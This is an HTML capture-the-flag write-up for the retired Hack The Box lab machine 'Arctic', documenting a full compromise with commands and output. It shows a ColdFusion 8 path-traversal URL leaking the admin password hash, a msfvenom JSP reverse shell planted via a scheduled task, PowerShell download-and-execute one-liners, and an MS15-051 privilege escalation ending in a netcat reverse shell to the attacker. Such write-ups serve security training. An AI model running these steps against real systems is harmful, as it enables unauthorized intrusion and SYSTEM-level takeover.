@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Arctic</strong></h1>
+        <em>Released: 22nd March 2017 / Pwned: August 30th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Arctic would be straightforward execept for that the fact that the web server is configured to delay your web request for 30 seconds before responding to you. Adobe ColdFusion, a web service you find running on port 8500, uses HMAC to authenticate user's passwords when logging in. The salt for this HMAC hash is configured to change every 30 seconds, which invalidates your authenticated web request. There's that, and having to wait 30 seconds every time you want to load a page is just annoying. You gain access to the Adobe ColdFusion admin panel, get a shell on the system by setting a Scheduled Task and elevate to SYSTEM by exploiting the MS15-051 vulnerability.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.11</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/arctic#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/intiail.txt&nbsp;10.10.10.11<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                8500/tcp&nbsp;&nbsp;open&nbsp;&nbsp;fmtp?<br>
+                49154/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose|phone|specialized<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;8|Phone|2008|7|8.1|Vista|2012&nbsp;(92%)<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_8<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;8.1&nbsp;Update&nbsp;1&nbsp;(92%),&nbsp;Microsoft&nbsp;Windows&nbsp;Phone&nbsp;7.5&nbsp;or&nbsp;8.0&nbsp;(92%),&nbsp;Microsoft&nbsp;Windows&nbsp;7&nbsp;or&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;(91%)<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Windows;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 135/rpc - Nothing to be gained here. Can run Impacket's <code>rpcdump.py</code> against the service if you like, but nothing of use<br>
+        • 8500/fmtp - What is this??<br>
+        • 49154/rpc - More RPC. Nothing to be gained here either.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 8500/?</strong></h2><br>
+        What is port 8500/fmtp?<br>
+        <br>
+        A google of port 8500 reveals a speedguide link - <a href="https://www.speedguide.net/port.php?port=8500">https://www.speedguide.net/port.php?port=8500</a><br>
+        <code>speedguide</code> says that port 8500 is used by Adobe ColdFusion.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 8500/Adobe ColdFusion</strong></h2><br>
+        Visit <code>http://10.10.10.11:8500</code> (and wait 30 seconds) and you'll be presented with a directory listing,<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Browse to <code>CFIDE/</code> &gt; <code>administrator/</code> and you'll be at an <code>Adobe ColdFusion 8</code> login page.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Adobe ColdFusion 8 is vulnerable to local file inclusion:<br>
+        <a href="https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes">https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes</a><br>
+        <br>
+        Visit:<br>
+            <div class="codebox">
+                http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+            </div>
+        </div><br>
+        and a SHA1 hash of the ColdFusion admin password will be printed to the page.<br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        You can crack the hash using a site like <code>hashkiller.co.uk</code>.<br>
+        <code>2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03</code> = <code>happyday</code><br>
+        <br>
+        Visit <code>http://10.10.10.11:8500/CFIDE/administrator/index.cfm</code> and log in with <code>admin</code> / <code>happyday</code>.<br>
+        (the login will fail if you try log in at <code>http://10.10.10.11:8500/CFIDE/administrator/enter.cfm</code>)<br>
+        <br>
+        You'll be at the Adobe ColdFusion administrator panel.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Adobe ColdFusion Shell</strong></h2><br>
+        From the Adobe ColdFusion administrator panel, you can get a system shell by Scheduling a New Task and having it download a shell from your attacking system.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>4a) Create .jsp shell and serve it</strong></h3><br>
+        First, generate a <code>.jsp</code> shell on your attacking machine using <code>msfvenom</code>.<br>
+        (with ColdFusion, you can use either a <code>.cfm</code> shell or a <code>.jsp</code> shell)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;msfvenom&nbsp;-p&nbsp;java/jsp_shell_reverse_tcp&nbsp;LHOST=10.10.14.8&nbsp;LPORT=9001&nbsp;-f&nbsp;raw&nbsp;-o&nbsp;shell.jsp<br>
+                Payload&nbsp;size:&nbsp;1496&nbsp;bytes<br>
+                Saved&nbsp;as:&nbsp;shell.jsp
+            </div>
+        </div><br>
+        <br>
+        And serve it to Adobe ColdFusion using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>4b) Find shell upload location</strong></h3><br>
+        Next we need to find where the shell will be uploaded to.<br>
+        <br>
+        Back on the ColdFusion panel, browse to Server Settings &gt; Mappings.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        You'll see the <code>/CFIDE</code> Logical Path, which points to the <code>C:\ColdFusion8\wwwroot\CFIDE</code> directory path.<br>
+        This directory is where our shell will be uploaded to.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>4c) Create scheduled task to download shell</strong></h3><br>
+        Now we need to create scheduled task to download the shell to the system.<br>
+        <br>
+        You can set a Scheduled Task that will download a file from a remote server and save it to a directory on the system.<br>
+        i.e. You set a task that will download a reverse shell from your attacking machine and save it to <code>C:\ColdFusion8\wwwroot\CFIDE</code> on the target system.<br>
+        <br>
+        Go to Debugging &amp; Logging &gt; Scheduled Tasks.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Click <code>Schedule New Task</code><br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        • Enter any Task Name you want.<br>
+        • In <code>URL</code> - input the URL of the shell being served by your attacking system.<br>
+        • Enter the admin username and password in <code>User Name</code> and <code>Password</code><br>
+        • Tick <code>Publish</code>'s <code>Save output to a file</code> option.<br>
+        • And in <code>File</code> - input the CFIDE path from Mappings - <code>C:\ColdFusion8\wwwroot\CFIDE\&lt;shell&gt;</code><br>
+        <br>
+        Click <code>Submit</code><br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        Run the scheduled task by clicking the far left button.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        You should see a message saying that the task was completed successfully.<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        As well as a hit on your python server, which means that the shell has been downloaded to the target.<br>
+            <div class="codebox">
+                ...<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.11&nbsp;-&nbsp;-&nbsp;[30/Aug/2019&nbsp;13:29:26]&nbsp;"GET&nbsp;/shell.jsp&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>4d) Run reverse shell</strong></h3><br>
+        Activate your shell by visiting <code>http://10.10.10.11/CFIDE/shell.jsp</code><br>
+        <br>
+        You should get a connection on your listener and a shell!<br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.11]&nbsp;49775<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7600]<br>
+                Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\ColdFusion8\runtime\bin&gt;
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                C:\ColdFusion8\runtime\bin&gt;dir&nbsp;C:\Users<br>
+                dir&nbsp;C:\Users<br>
+                &nbsp;Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F88F-4EA5<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C:\Users<br>
+                <br>
+                22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                22/03/2017&nbsp;&nbsp;09:10&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                14/07/2009&nbsp;&nbsp;07:57&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public<br>
+                22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tolis<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Dir(s)&nbsp;&nbsp;33.193.164.800&nbsp;bytes&nbsp;free<br>
+                <br>
+                C:\ColdFusion8\runtime\bin&gt;type&nbsp;C:\Users\tolis\Desktop\user.txt<br>
+                type&nbsp;C:\Users\tolis\Desktop\user.txt<br>
+                02650d...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Find Priv-Esc Route</strong></h2><br>
+        Check what user you are with <code>whoami</code>.<br>
+        We're <code>tolis</code>.<br>
+            <div class="codebox">
+                C:\ColdFusion8\runtime\bin&gt;whoami<br>
+                whoami<br>
+                arctic\tolis
+            </div>
+        </div><br>
+        <br>
+        Run <code>systeminfo</code> to find the OS version, system architecture and Hotfixes installed<br>
+            <div class="codebox">
+                C:\ColdFusion8\runtime\bin&gt;systeminfo<br>
+                systeminfo<br>
+                <br>
+                Host&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ARCTIC<br>
+                OS&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;Standard&nbsp;<br>
+                ...<br>
+                System&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64-based&nbsp;PC<br>
+                ...<br>
+                Hotfix(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        ARCTIC is a 64-bit Windows Server 2008 R2 machine with no Hotfixes (updates) installed.<br>
+        <br>
+        Windows Server 2008 R2 is from 2009. It's pretty old.<br>
+        There's most likely a priv-esc exploit available for it.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) Sherlock.ps1</strong></h2><br>
+        Sherlock is a powershell script written by RastaMouse that will check the target system for local privilege escalation exploits.<br>
+        Download Sherlock to your attacking machine and serve it with <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;wget&nbsp;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1<br>
+                ...<br>
+                root@gotham:~/ctf/arctic#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run Sherlock remotely using powershell's DownloadString functionality<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;powershell.exe&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;"IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString('http://10.10.14.8:8000/Sherlock.ps1');&nbsp;Find-AllVulns"<br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Task&nbsp;Scheduler&nbsp;.XML<br>
+                MSBulletin&nbsp;:&nbsp;MS10-092<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2010-3338,&nbsp;2010-3888<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/19930/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ClientCopyImage&nbsp;Win32k<br>
+                MSBulletin&nbsp;:&nbsp;MS15-051<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2015-1701,&nbsp;2015-2433<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/37367/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Secondary&nbsp;Logon&nbsp;Handle<br>
+                MSBulletin&nbsp;:&nbsp;MS16-032<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2016-0099<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/39719/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                <br>
+                &lt;---&nbsp;if&nbsp;the&nbsp;shell&nbsp;hangs&nbsp;after&nbsp;finishing,&nbsp;press&nbsp;enter&nbsp;---&gt;
+            </div>
+        </div><br>
+        <br>
+        Sherlock reports that there are 3 potential priv-esc exploits.<br>
+        From past Windows Server 2008 R2 boxes, I know that <code>MS15-051</code> works reliably, so I went with that.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) MS15-051</strong></h2><br>
+        There's a nice github repository of pre-compiled MS15-051 exploits available here - <a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051">https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051</a><br>
+        (thanks jivoi)<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>7a) Serve ms15-051.exe to target</strong></h3><br>
+        Download a pre-compiled 64-bit ms15-051.exe exploit from the repo above to your attacking machine and serve it using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;wget&nbsp;https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe<br>
+                ...<br>
+                root@gotham:~/ctf/arctic#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Back on ARCTIC, move to <code>tolis</code>'s <code>temp</code> directory so that we can download our exploit to the target.<br>
+        Download the exploit from your attacking machine using powershell's DownloadFile functionality.<br>
+            <div class="codebox">
+                C:\ColdFusion8\runtime\bin&gt;cd&nbsp;%temp%<br>
+                <br>
+                C:\Users\tolis\AppData\Local\Temp&gt;powershell&nbsp;-c&nbsp;"(new-object&nbsp;System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/ms15-051.exe','C:\Users\tolis\AppData\Local\Temp\ms15-051.exe')"<br>
+                <br>
+                &lt;---&nbsp;if&nbsp;the&nbsp;shell&nbsp;hangs,&nbsp;press&nbsp;enter&nbsp;after&nbsp;you&nbsp;see&nbsp;a&nbsp;download&nbsp;hit&nbsp;on&nbsp;your&nbsp;python&nbsp;server&nbsp;---&gt;
+            </div>
+        </div><br>
+        <br>
+        You should see a hit on your python server<br>
+            <div class="codebox">
+                ...<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.11&nbsp;-&nbsp;-&nbsp;[30/Aug/2019&nbsp;14:20:37]&nbsp;"GET&nbsp;/ms15-051.exe&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And the exploit will have been downloaded to the target.<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;dir<br>
+                dir<br>
+                &nbsp;Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F88F-4EA5<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C:\Users\tolis\AppData\Local\Temp<br>
+                <br>
+                01/09/2019&nbsp;&nbsp;12:18&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                01/09/2019&nbsp;&nbsp;12:18&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                31/08/2019&nbsp;&nbsp;08:57&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hsperfdata_tolis<br>
+                22/03/2017&nbsp;&nbsp;10:00&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Low<br>
+                01/09/2019&nbsp;&nbsp;12:18&nbsp;��&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;55.296&nbsp;ms15-051.exe<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;55.296&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;Dir(s)&nbsp;&nbsp;33.189.732.352&nbsp;bytes&nbsp;free
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>7b) Test ms15-051.exe</strong></h3><br>
+        This <code>ms15-051.exe</code> exploit takes, as a parameter, a command to run as SYSTEM.<br>
+        <br>
+        Test the exploit works by running the exploit with <code>whoami</code>.<br>
+        We should get back <code>nt authority\system</code>.<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;.\ms15-051.exe&nbsp;whoami<br>
+                .\ms15-051.exe&nbsp;whoami<br>
+                [#]&nbsp;ms15-051&nbsp;fixed&nbsp;by&nbsp;zcgonvh<br>
+                [!]&nbsp;process&nbsp;with&nbsp;pid:&nbsp;3308&nbsp;created.<br>
+                ==============================<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        Nice! We can run commands as SYSTEM.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) SYSTEM shell with ms15-051.exe</strong></h2><br>
+        You can get shell as <code>SYSTEM</code> using the <code>ms15-051.exe</code> exploit by having it run netcat and connect back to a listener on your attacking machine.<br>
+        Windows doesn't have a built-in netcat tool, so we'll have to serve it one.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>8a) Serve nc64.exe to target</strong></h3><br>
+        Download a 64-bit netcat binary to your attacking system and serve it using <code>python -m SimpleHTTPServer</code>.<br>
+        There's a nice repo of windows priv-esc tools here - <a href="https://github.com/phackt/pentest/tree/master/privesc/windows">https://github.com/phackt/pentest/tree/master/privesc/windows</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;wget&nbsp;https://github.com/phackt/pentest/raw/master/privesc/windows/nc64.exe<br>
+                ...<br>
+                root@gotham:~/ctf/arctic#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Using powerhsell's DownloadFile functionality (like before), download the netcat binary to the target.<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;powershell&nbsp;-c&nbsp;"(new-object&nbsp;System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/nc64.exe','.\nc64.exe')"<br>
+                <br>
+                &lt;---&nbsp;if&nbsp;the&nbsp;shell&nbsp;hangs,&nbsp;press&nbsp;enter&nbsp;after&nbsp;you&nbsp;see&nbsp;a&nbsp;download&nbsp;hit&nbsp;on&nbsp;your&nbsp;python&nbsp;server&nbsp;---&gt;
+            </div>
+        </div><br>
+        <br>
+        A netcat binary will now be on the target.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>8b) Receive SYSTEM shell</strong></h3><br>
+        Start a listener on your attacking machine to receive the reverse shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/arctic#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run <code>.\ms15-051.exe "nc64.exe -e cmd.exe &lt;attacker port&gt; &lt;attacker port&gt;"</code>, which will send a <code>cmd</code> shell back to your listener.<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;.\ms15-051.exe&nbsp;"nc64.exe&nbsp;-e&nbsp;cmd.exe&nbsp;10.10.14.8&nbsp;9002"<br>
+                [#]&nbsp;ms15-051&nbsp;fixed&nbsp;by&nbsp;zcgonvh<br>
+                [!]&nbsp;process&nbsp;with&nbsp;pid:&nbsp;1376&nbsp;created.<br>
+                ==============================<br>
+                &lt;&nbsp;---&nbsp;SHELL&nbsp;HANGS&nbsp;---&nbsp;&gt;
+            </div>
+        </div><br>
+        <br>
+        You should see a connection from ARCTIC and a SYSTEM shell!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.11]&nbsp;50011<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7600]<br>
+                Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\Users\tolis\AppData\Local\Temp&gt;whoami<br>
+                whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>root.txt</code>.<br>
+            <div class="codebox">
+                C:\Users\tolis\AppData\Local\Temp&gt;type&nbsp;C:\Users\Administrator\Desktop\root.txt<br>
+                type&nbsp;C:\Users\Administrator\Desktop\root.txt<br>
+                ce65ce...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
